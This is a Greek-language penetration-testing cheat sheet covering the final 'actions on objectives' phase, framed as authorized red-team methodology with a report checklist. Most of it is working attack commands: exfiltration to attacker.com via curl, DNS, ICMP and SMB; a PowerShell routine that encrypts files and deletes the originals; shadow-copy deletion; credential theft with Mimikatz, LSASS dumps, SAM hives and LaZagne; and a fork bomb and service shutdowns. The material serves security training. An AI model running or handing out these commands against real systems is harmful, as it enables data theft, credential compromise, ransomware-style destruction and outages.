# 🎯 Φάση 7: Ενέργειες για την επίτευξη στόχων (Actions on Objectives)

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../07-Actions-Objectives.md) • [🇮🇹 Italiano](07-Actions-Objectives.it.md) • [🇹🇷 Türkçe](07-Actions-Objectives.tr.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Στόχος:** Μελέτη της τελικής επίπτωσης μιας επίθεσης, όπως εξαγωγή δεδομένων ή διακοπή λειτουργίας, στο πλαίσιο του συμφωνημένου ελέγχου.

---

## Πριν ξεκινήσετε

Οι **τελικές ενέργειες** δείχνουν ποια επίπτωση μπορεί να έχει η πρόσβαση που αποκτήθηκε. Η **εξαγωγή δεδομένων (exfiltration)** είναι μεταφορά δεδομένων έξω από το ελεγχόμενο περιβάλλον. Η **συλλογή στοιχείων ταυτοποίησης (credential harvesting)** αφορά κωδικούς, συνόψεις και κλειδιά. Η **άρνηση υπηρεσίας (DoS)** αφορά υποβάθμιση ή απώλεια διαθεσιμότητας.

Στη δοκιμή διείσδυσης η τεκμηρίωση πρέπει να υπηρετεί τον συμφωνημένο στόχο. Η απόδειξη ότι μια αδυναμία υπάρχει δεν προϋποθέτει καταστροφή δεδομένων ή μαζική εξαγωγή τους. Τα παραδείγματα αυτής της ενότητας περιλαμβάνουν πραγματικά καταστροφικές εντολές, ακόμη και όταν το πρωτότυπο τα ονομάζει «προσομοίωση».

**Όροι που εμφανίζονται παρακάτω:** Το **staging** είναι προσωρινή συγκέντρωση δεδομένων πριν τη μεταφορά. Το **ransomware** είναι κακόβουλο λογισμικό εκβιασμού, συχνά με κρυπτογράφηση αρχείων. Τα **Volume Shadow Copies** είναι αντίγραφα επαναφοράς των Windows, το **SAM** αποθηκεύει πληροφορίες τοπικών λογαριασμών και η διεργασία **LSASS** συμμετέχει στην ασφάλεια και την ταυτοποίηση των Windows.

## Περιεχόμενα

- [📤 Εξαγωγή δεδομένων εκτός του συστήματος (Data Exfiltration)](#section-01)
- [💣 Καταστροφικές ενέργειες — παράδειγμα προσομοίωσης ransomware](#section-02)
- [🔐 Συλλογή στοιχείων ταυτοποίησης (Credential Harvesting)](#section-03)
- [🖥️ Επιπτώσεις στη λειτουργία συστήματος](#section-04)
- [📊 Γρήγορη αναφορά](#section-05)
- [✅ Λίστα ελέγχου αναφοράς δοκιμής διείσδυσης (Pentest Report)](#section-06)
- [🔗 Σχετικοί οδηγοί αναφοράς](#section-07)

<a id="section-01"></a>

## 📤 Εξαγωγή δεδομένων εκτός του συστήματος (Data Exfiltration)

### Εντοπισμός ευαίσθητων δεδομένων

#### Windows
```cmd
# Αναζήτηση ευαίσθητων αρχείων
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Εντοπισμός αρχείων που άλλαξαν πρόσφατα
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell — αναζήτηση στο περιεχόμενο
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Αναζήτηση ευαίσθητων αρχείων
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Πρόσφατα αρχεία
find / -mtime -7 -type f 2>/dev/null

# Μεγάλα αρχεία
find / -size +100M -type f 2>/dev/null
```

### Συμπίεση και προετοιμασία δεδομένων για μεταφορά

#### Windows
```powershell
# PowerShell — δημιουργία συμπιεσμένου αρχείου ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Συμπίεση με tar
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Δημιουργία συμπιεσμένου αρχείου
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# Με κρυπτογράφηση
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP με κωδικό πρόσβασης
zip -r -e data.zip /sensitive/
```

### Μέθοδοι εξαγωγής δεδομένων

#### HTTP/HTTPS
```bash
# Μεταφόρτωση με curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Μεταφορά κωδικοποιημένων δεδομένων Base64 — η παρακάτω curl χρησιμοποιεί POST, όχι GET
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# Μεταφόρτωση με PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### Εξαγωγή δεδομένων μέσω ερωτημάτων DNS
```bash
# Κωδικοποίηση δεδομένων μέσα σε ερωτήματα DNS
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Χρήση dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Παράδειγμα μεταφοράς δεδομένων μέσω ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Χρήση icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB

Πρωτόκολλο που χρησιμοποιείται μεταξύ άλλων για κοινόχρηστα αρχεία και διαχειριστικές λειτουργίες Windows.

```bash
# Αντιγραφή στον κοινόχρηστο πόρο του ελεγκτή
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Πρόσβαση σε κοινόχρηστο πόρο και αντιγραφή από Linux
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Υπηρεσίες νέφους (Cloud)
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

<a id="section-02"></a>

## 💣 Καταστροφικές ενέργειες — παράδειγμα προσομοίωσης ransomware

> ⚠️ **ΠΡΟΣΟΧΗ:** Αποκλειστικά για ρητά εξουσιοδοτημένα σενάρια ελέγχου σε απομονωμένο περιβάλλον. Ο παρακάτω κώδικας μπορεί να διαγράψει ή να καταστήσει μη ανακτήσιμα αρχεία και αντίγραφα επαναφοράς. Η λέξη «προσομοίωση» δεν τον καθιστά ακίνδυνο.

### Παράδειγμα κρυπτογράφησης αρχείων

**Πραγματική επίπτωση:** ο κώδικας δημιουργεί νέα αρχεία και στη συνέχεια καλεί `Remove-Item` για τα αρχικά. Δεν παρέχει διαδικασία επαναφοράς και δεν είναι ακίνδυνο δοκιμαστικό δείγμα.

```powershell
# PowerShell — κρυπτογράφηση με διαγραφή πρωτοτύπων: καταστροφικό παράδειγμα
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Διαγραφή αντιγράφων επαναφοράς (Volume Shadow Copies)

Η διαγραφή αντιγράφων επαναφοράς αφαιρεί δυνατότητες ανάκτησης. Η τελευταία εντολή του πρωτοτύπου μεταβάλλει το όριο αποθήκευσης· δεν αποδεικνύει καθολική απενεργοποίηση αντιγράφων.

```cmd
# Διαγραφή αντιγράφων επαναφοράς — εμποδίζει την ανάκτηση
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Μεταβολή ορίου χώρου αντιγράφων επαναφοράς — δεν ισοδυναμεί με καθολική απενεργοποίηση
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

<a id="section-03"></a>

## 🔐 Συλλογή στοιχείων ταυτοποίησης (Credential Harvesting)

### Στοιχεία ταυτοποίησης Windows
```powershell
# Mimikatz — αναζήτηση στοιχείων σύνδεσης στη συνεδρία
mimikatz# sekurlsa::logonpasswords

# Εξαγωγή βάσης λογαριασμών SAM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# Αντίγραφο μνήμης διεργασίας LSASS
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Ανάλυση αντιγράφου μνήμης
pypykatz lsa minidump lsass.dmp
```

### Στοιχεία ταυτοποίησης Linux
```bash
# Αρχείο συνόψεων κωδικών shadow
cat /etc/shadow

# Κλειδιά SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Αρχεία ιστορικού εντολών
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Αρχεία ρυθμίσεων
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Αποθηκευμένα στοιχεία σύνδεσης φυλλομετρητή (Browser)
```bash
# Αποθηκευμένα στοιχεία Chrome στα Windows
# Τοποθεσία: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Αποθηκευμένα στοιχεία Firefox στα Windows
# Τοποθεσία: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne — ανάκτηση αποθηκευμένων κωδικών
python laZagne.py all
```

---

<a id="section-04"></a>

## 🖥️ Επιπτώσεις στη λειτουργία συστήματος

### Άρνηση υπηρεσίας (Denial of Service)

Τα παραδείγματα μπορούν να εξαντλήσουν διεργασίες, χώρο δίσκου ή επεξεργαστή. Δεν απαιτείται η εκτέλεσή τους για την ανάγνωση ή την κατανόηση της ενότητας.

```bash
# Εξάντληση διεργασιών στο Linux (Fork Bomb) — ΜΗΝ ΤΟ ΕΚΤΕΛΕΣΕΤΕ
:(){ :|:& };:

# Παράδειγμα εξάντλησης χώρου δίσκου
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# Παράδειγμα επιβάρυνσης επεξεργαστή
yes > /dev/null &
```

### Μεταβολή λογαριασμών

Οι εντολές αφορούν συγκεκριμένους λογαριασμούς. Η αλλαγή κωδικού του `administrator` δεν αλλάζει τους κωδικούς όλων των χρηστών.

```bash
# Αλλαγή κωδικού του συγκεκριμένου λογαριασμού administrator
net user administrator NewP@ssw0rd!

# Απενεργοποίηση λογαριασμού
net user username /active:no

# Διαγραφή χρήστη
net user username /delete
```

### Διακοπή λειτουργίας υπηρεσιών
```cmd
# Διακοπή κρίσιμων υπηρεσιών
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Απενεργοποίηση υπηρεσιών
sc config wuauserv start= disabled
```

---

<a id="section-05"></a>

## 📊 Γρήγορη αναφορά

### Μέθοδοι εξαγωγής δεδομένων

| Μέθοδος | Πλεονεκτήματα | Περιορισμοί |
| -------- | ------ | ------ |
| HTTP/HTTPS | Συνηθισμένος τύπος κίνησης· κρυπτογράφηση μόνο με HTTPS | Μπορεί να παρακολουθείται |
| DNS | Μπορεί να ελέγχεται λιγότερο, ανάλογα με το δίκτυο | Χαμηλή ταχύτητα και περιορισμένο μέγεθος |
| ICMP | Ενδέχεται να επιτρέπεται από ορισμένους κανόνες δικτύου | Πολύ χαμηλή ταχύτητα |
| SMB | Γρήγορη, ενσωματωμένη λειτουργία | Συνήθως περιορίζεται στο εσωτερικό δίκτυο |
| Υπηρεσίες νέφους (Cloud) | Κανονικές υπηρεσίες μεταφοράς και αποθήκευσης | Απαιτούνται στοιχεία πρόσβασης |

### Προτεραιότητες εντοπισμού δεδομένων

| Τοποθεσία | Αξία δεδομένων |
| ---------- | ------- |
| Ελεγκτής τομέα (Domain Controller) | Πολύ υψηλή — στοιχεία ταυτοποίησης Active Directory |
| Διακομιστές αρχείων | Υψηλή — έγγραφα |
| Διακομιστές ηλεκτρονικού ταχυδρομείου | Υψηλή — επικοινωνίες |
| Διακομιστές βάσεων δεδομένων | Υψηλή — επιχειρησιακά δεδομένα |
| Διακομιστές ανάπτυξης λογισμικού | Μέση — πηγαίος κώδικας |
| Σταθμοί εργασίας χρηστών | Μέση — τοπικά αρχεία |

---

<a id="section-06"></a>

## ✅ Λίστα ελέγχου αναφοράς δοκιμής διείσδυσης (Pentest Report)

```markdown
- [ ] Καταγραφή όλων των συστημάτων στα οποία αποκτήθηκε πρόσβαση
- [ ] Ασφαλής καταγραφή των στοιχείων σύνδεσης που εντοπίστηκαν
- [ ] Αποτύπωση της διαδρομής από την αρχική πρόσβαση
- [ ] Τεκμηρίωση των ευπαθειών που αξιοποιήθηκαν
- [ ] Καταγραφή τοποθεσιών ευαίσθητων δεδομένων
- [ ] Προτάσεις αποκατάστασης των αδυναμιών
- [ ] Χρονολόγιο των ενεργειών
- [ ] Στιγμιότυπα τεκμηρίωσης της πρόσβασης
```

---

<a id="section-07"></a>

## 🔗 Σχετικοί οδηγοί αναφοράς

- [Mimikatz](../../Mimikatz/translations/README.el.md)
- [Εντολές Linux](../../Linux-Commands/translations/README.el.md)
- [PowerShell](../../PowerShell/translations/README.el.md)

---

**Προηγούμενη φάση:** [← 06 — Αποφυγή μηχανισμών άμυνας](06-Defense-Evasion.el.md)

**Επιστροφή στην επισκόπηση:** [🎯 Τα στάδια της μεθοδολογίας](README.el.md)

---

<p align="center">
  <b>🎯 Ολοκλήρωση της μεθοδολογίας</b><br>
  <i>Οι ενέργειες προϋποθέτουν ρητή εξουσιοδότηση και συμφωνημένο πεδίο ελέγχου.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
